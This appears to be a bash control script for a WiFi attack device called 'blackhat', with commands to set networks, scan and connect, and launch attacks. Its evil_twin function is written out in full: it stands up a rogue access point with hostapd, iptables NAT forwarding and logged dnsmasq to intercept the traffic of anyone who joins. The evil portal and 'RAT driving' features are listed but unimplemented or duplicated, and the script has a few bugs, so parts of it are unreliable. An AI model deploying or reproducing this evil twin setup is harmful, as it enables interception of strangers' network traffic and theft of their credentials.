#!/bin/bash

CONFIG_F=blackhat.conf

if test -f $CONFIG_F; then
	CONFIG_F=$(pwd)/$CONFIG_F
	LOG_F=blackhat.log
elif test -f /mnt/$CONFIG_F; then 
	CONFIG_F=$/mnt/$CONFIG_F
	LOG_F=/mnt/blackhat.log
elif test -f /etc/$CONFIG_F; then 
	CONFIG_F=/etc/blackhat.conf
	LOG_F=/var/log/blackhat.log
else
	echo "Could not load conf file"
	exit
fi

echo "Loaded Config From: $CONFIG_F"

source $CONFIG_F 
rm $LOG_F 2>/dev/null

function print_help() {
	echo "Usage (eg): bh set SSID MySSID"
	echo "Commands:"
	echo "  set"
	echo "    SSID       Set SSID of WiFi network to connect to"
	echo "    PASS       Set password for WiFi network: SSID"
	echo "    AP_SSID    Set SSID of WiFi network you're creating"
	echo "  wifi         Connect to a WiFi network"
    echo "    list       List WiFi APs"
    echo "    connect    Connect to WiFi AP"
	echo "    ap         Enable Access Point"
	echo "  ssh          Enable SSH"
	echo "  evil_twin    Enable the evil twin AP"
	echo "  evil_portal  Enable the evil portal AP"
    echo "  rat_driver   Enable RAT Driving"
	echo "  get          Get currently set parameters"
}

function connect_wifi() {
	wpa_supplicant -B -i $1 -c <(wpa_passphrase $SSID $PASS)
}

function evil_twin() {
	ip link set $RADIO_AP down
	ip addr add 192.168.99.1/24 dev $RADIO_AP
	iptables --table nat --append POSTROUTING --out-interface $RADIO_CLIENT -j MASQUERADE
	iptables --append FORWARD --in-interface $RADIO_AP -j ACCEPT
	echo 1 > /proc/sys/net/ipv4/ip_forward

	hostapd /etc/hostapd.conf &
	connect_wifi $RADIO_CLIENT

	kill $(pidof dnsmasq)
	dnsmasq -C /etc/dnsmasq.conf -d 2>&1 > $LOG_F & 
}

function ap() {
    echo "Opening Access Point"

}

function evil_portal() {
    echo "Not Implemented yet!"
}

function evil_portal() {
    echo "Not Implemented yet!"
}

function set() {
	sed -i "/^$1=/c$1=\"$2\"" ${CONFIG_F}	
}

function wifi() {
	case "$1" in
		list)
			iw $RADIO_CLIENT scan | grep "SSID:"
			;;
		connect)
			ip link set $RADIO_CLIENT up
			connect_wifi $RADIO_CLIENT
			;;
        ap)
            echo "Not implemented YEt"
            ;;
		*)
			print_help
	esac
}

subcommand=$1; shift  
case "$subcommand" in
	set)
		set "$@"
		;;
	get)
		cat $CONFIG_F
		;;
	wifi)
		wifi "$@"
		;;
	evil_twin)
		evil_twin
		;;
	help)
		print_help
		;;
	*)
		print_help
		;;
esac
